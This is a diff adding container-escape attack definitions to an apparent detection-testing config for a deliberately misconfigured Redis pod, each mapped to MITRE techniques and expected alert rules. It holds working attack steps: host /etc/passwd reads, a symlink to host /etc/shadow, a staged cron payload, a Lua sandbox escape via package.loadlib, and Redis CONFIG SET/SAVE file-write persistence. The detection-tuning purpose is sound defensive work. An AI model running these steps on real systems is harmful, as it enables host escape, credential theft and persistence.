@@ -586,6 +586,210 @@ attacks:
         command: sh
 
   # ═══════════════════════════════════════════════════════════════════════════
+  # REAL-WORLD CONTAINER-ESCAPE ATTACKS — exploit deployment misconfigs
+  #
+  # These attacks target the intentional misconfigurations in
+  # redis-vulnerable.yaml (Docker socket, host-/etc mount, host-/tmp mount,
+  # CAP_SYS_PTRACE). They map to MITRE ATT&CK for Containers and reproduce
+  # the footprints of real Redis-targeting malware: P2Pinfect, HeadCrab,
+  # Muhstik, Redigo. Each attack triggers always-on detection rules so the
+  # tuner can confirm the misconfig is observable without relying on
+  # cluster-config-dependent rules (R1006, R1011).
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # ── T1083 + TA0007 Discovery: enumerate suspicious mounts ─────────────────
+  # Real-world: all Redis-malware families do this first to find escape
+  # vectors. We grep mountinfo for hostPath patterns (docker.sock, /etc, /tmp)
+  # which proves the misconfigs are present AND emits R0001 since `grep`
+  # is not in the redis-server baseline.
+  - name: escape-mount-enumeration
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "grep -E 'docker.sock|/host-etc|/host-tmp' /proc/self/mountinfo | head -10; echo mount_enum_done"]
+    successIndicators:
+      - responseContains: "mount_enum_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: grep
+
+  # ── T1610 Deploy Container: probe Docker socket ───────────────────────────
+  # If the docker.sock mount is present (it is, read-only), an attacker can
+  # at minimum *list* containers/images on the host — enough to identify
+  # privileged candidates to target with a separate writable foothold.
+  # Real-world: HeadCrab and P2Pinfect both probe /var/run/docker.sock.
+  - name: escape-docker-socket-probe
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "if [ -S /var/run/docker.sock ]; then ls -la /var/run/docker.sock; echo docker_sock_present; else echo docker_sock_absent; fi"]
+    successIndicators:
+      - responseContains: "docker_sock"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: ls
+
+  # ── T1552.001 Credentials in Files: read host /etc/passwd via mount ───────
+  # The host-etc mount exposes the host's /etc read-only. Reading
+  # /host-etc/passwd is a high-confidence "I am no longer in the container's
+  # root filesystem" signal. R0010 fires for sensitive-path access; R0001
+  # fires because cat is not in the redis baseline.
+  - name: escape-host-etc-passwd
+    type: cmdinject
+    exec:
+      command: ["cat", "/host-etc/passwd"]
+    successIndicators:
+      - responseContains: "root:"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: cat
+      - ruleID: R0010
+        ruleName: Unexpected Sensitive File Access
+        containerName: redis
+        command: cat
+
+  # ── T1611 Escape to Host: symlink a host-mounted file into reach ──────────
+  # Classic symlink trick: if /host-tmp is writable from inside, an attacker
+  # can create a symlink there pointing to host /etc/shadow (via /host-etc),
+  # then a cooperating process on the host (or another container sharing
+  # /tmp) reads the symlink, exfiltrating the host secret. R1010 fires when
+  # a symlink targets a sensitive path.
+  - name: escape-symlink-host-shadow
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "ln -sf /host-etc/shadow /host-tmp/shadow_symlink_$$ && ls -l /host-tmp/shadow_symlink_$$ && rm -f /host-tmp/shadow_symlink_$$ && echo symlink_done"]
+    successIndicators:
+      - responseContains: "symlink_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: ln
+      - ruleID: R1010
+        ruleName: Soft link created over sensitive file
+        containerName: redis
+        command: ln
+
+  # ── T1053.003 Cron Persistence: drop a cron file via writable host /tmp ───
+  # If /host-tmp is writable, an attacker can stage a cron payload in the
+  # shared host /tmp that root-owned host services (logrotate, tmpfiles.d)
+  # may pick up. We also write a "cron-style" file directly to test that
+  # writes to predictable persistence paths fire detection rules.
+  # Real-world: Muhstik drops cron entries this way.
+  - name: escape-cron-stage-host-tmp
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "echo '* * * * * root /bin/sh /tmp/.r 2>/dev/null' > /host-tmp/.bob_cron_probe_$$ && cat /host-tmp/.bob_cron_probe_$$ && rm -f /host-tmp/.bob_cron_probe_$$ && echo cron_stage_done"]
+    successIndicators:
+      - responseContains: "cron_stage_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: sh
+
+  # ── T1055.008 Ptrace Code Injection probe (CAP_SYS_PTRACE granted) ────────
+  # The deployment grants CAP_SYS_PTRACE. Without hostPID we can only ptrace
+  # processes in the redis pod's PID namespace, but reading /proc/1/maps
+  # works and proves the capability is dangerous. R0008 fires for procfs
+  # environment/maps reads.
+  - name: escape-ptrace-init-maps
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cat /proc/1/maps | head -3 && echo ptrace_maps_done"]
+    successIndicators:
+      - responseContains: "ptrace_maps_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: cat
+
+  # ── T1611 Process pivot from Lua sandbox (the "redis-server should NEVER
+  # spawn child processes" detection) ───────────────────────────────────────
+  # Redis-server normally runs single-threaded with no fork-exec. ANY exec
+  # from inside the redis container is anomalous and should fire R0001 even
+  # if the spawned binary itself looks innocuous. This proves the baseline
+  # tightly captures "redis-server is the only exec" and any pivot — Lua,
+  # CONFIG SET dir RDB write hijack, MODULE LOAD — surfaces immediately.
+  - name: escape-process-pivot-via-lua
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return "sandbox_blocked" end
+        -- Spawn /bin/true — the most innocuous binary possible.
+        -- Detection should fire purely because redis spawned ANY child.
+        local cmd = io_mod.popen("/bin/true 2>&1; echo pivot_done")
+        local result = cmd:read('*a')
+        cmd:close()
+        return result
+    successIndicators:
+      - responseContains: "pivot_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+
+  # ── T1098.004 Persistence: RDB write to host-shared path ──────────────────
+  # Classic Redis persistence: CONFIG SET dir to a writable host-shared
+  # location (/host-tmp), CONFIG SET dbfilename to a payload-like name,
+  # then SAVE to drop the RDB file there. P2Pinfect and Redigo both use
+  # this against /var/spool/cron and /root/.ssh on misconfigured Redis.
+  # The CONFIG SETs themselves don't emit detections (they're protocol
+  # commands), but the SAVE writes a file to /host-tmp which fires R0002
+  # (file access anomaly) on the cross-namespace write.
+  - name: escape-rdb-write-host-tmp
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/host-tmp"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  - name: escape-rdb-write-payload
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dbfilename", "bob_redis_persist_probe.rdb"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  - name: escape-rdb-save-trigger
+    type: custom
+    redis:
+      command: ["SAVE"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  # Cleanup the RDB write probe so /host-tmp doesn't accumulate stage files.
+  - name: escape-rdb-cleanup
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "rm -f /host-tmp/bob_redis_persist_probe.rdb && echo rdb_cleanup_done"]
+    successIndicators:
+      - responseContains: "rdb_cleanup_done"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: rm
+
+  # ═══════════════════════════════════════════════════════════════════════════
   # CLEANUP — Restore Redis CONFIG mutations (PR119 rabbit)
   # CONFIG SET dir / dbfilename change persistent server state. Without
   # restoration the changes leak into later test runs of the same suite,
